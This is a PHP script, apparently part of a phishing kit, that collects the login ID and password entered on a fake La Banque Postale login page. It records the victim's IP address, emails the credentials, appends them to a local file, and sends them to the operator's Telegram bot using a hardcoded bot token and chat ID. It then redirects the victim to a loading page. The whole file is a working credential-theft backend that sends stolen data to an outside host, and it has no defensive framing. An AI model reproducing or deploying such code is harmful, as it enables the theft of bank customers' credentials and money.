<?php
$ip = $_SERVER['REMOTE_ADDR'];

$message .= "--++---------💥Login BanquePostale💥--------++--\n";
$message .= "------------------------------------------------------------------------------------\n";
$message .= " USER ID : ".$_POST['IDE']."\n";
$message .= " USER PASS : ".$_POST['MDP']."\n";
$message .= "--++---------💥Info BanquePostale💥--------++--\n";
$message .= "IP: $ip \n";
$subject .= "--------------💥💥💥Login BanquePostale💥💥💥-----------------";
$sender = "--------------💥💥💥Login BanquePostale💥💥💥-----------------";
mail($email,$subject,$message);

$text = fopen('../hi.txt', 'a');
fwrite($text, $message);
// IMPORTANT VARIABLE MUST BE CHANGED FOR TELEGRAM


$token = "2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM";
file_get_contents("https://api.telegram.org/bot2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM/sendMessage?chat_id=1556350571&text=" . urlencode($message)."" );

header("Location: loading.php");

?>
